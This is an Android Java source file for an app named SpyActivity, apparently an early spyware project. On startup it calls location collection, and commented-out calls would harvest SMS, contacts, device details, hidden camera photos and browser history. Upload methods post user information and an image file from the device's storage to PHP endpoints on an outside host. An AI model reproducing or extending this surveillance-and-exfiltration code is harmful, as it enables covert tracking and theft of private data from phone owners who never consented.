package com.example.spyapp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import localisationInformations.Localisation;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.os.Bundle;
import android.os.Looper;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import browserInformations.BrowserHistory;

public class SpyActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		//print sms conversations
		//(new GetSMS()).getAllSms(this);
		
		//(new ListContact()).CreateListContactFromPhone(this);
	//(new PhoneDevice()).setAllPhoneDeviceInformations();
		
		//(new Picture()).takePictureNoPreview(this);
		//(new Localisation()).getGPS(this);
		(new Localisation())._getLocation(this);
		//(new BrowserHistory()).getBrowserHist(this);
		Button sendButton = (Button) findViewById(R.id.button1);
		final SpyActivity zis = this;
		sendButton.setOnClickListener(new View.OnClickListener() {
		    public void onClick(View view) {
		            //upload();
		    		Thread t = new Thread(new Runnable() {
						public void run() {
							Looper.prepare();
							try {
								uploadUtilisateur();
								Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
					        } catch (Exception e) {
					            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
					            e.printStackTrace();
					        }
						}
					});
		    		t.start();
		    }
		});
		
	       
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	public void uploadUtilisateur() throws Exception {
		// Create a new HttpClient and Post Header
	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://uqac.netii.net/senduserinfos.php");

	    try {
	        // Add your data
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	        nameValuePairs.add(new BasicNameValuePair("nom", "Sylvain"));
	        nameValuePairs.add(new BasicNameValuePair("gmail", "<contact></contact>"));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        // Execute HTTP Post Request
	        HttpResponse response = httpclient.execute(httppost);

	    } catch (ClientProtocolException e) {
	        // TODO Auto-generated catch block
	    } catch (IOException e) {
	        // TODO Auto-generated catch block
	    }
    }
	
	
	
	
	
	
	
	
	public void upload() throws Exception {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;

        String pathToOurFile = "/sdcard/img.jpg";
        String urlServer = "http://uqac.netii.net/sendimage.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;

            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            URL url = new URL(urlServer);

            connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream
                    .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                            + pathToOurFile + "\"" + lineEnd);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            String serverResponseMessage = connection.getResponseMessage();

            Toast.makeText(this, serverResponseMessage, Toast.LENGTH_LONG).show();

            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
    }
}
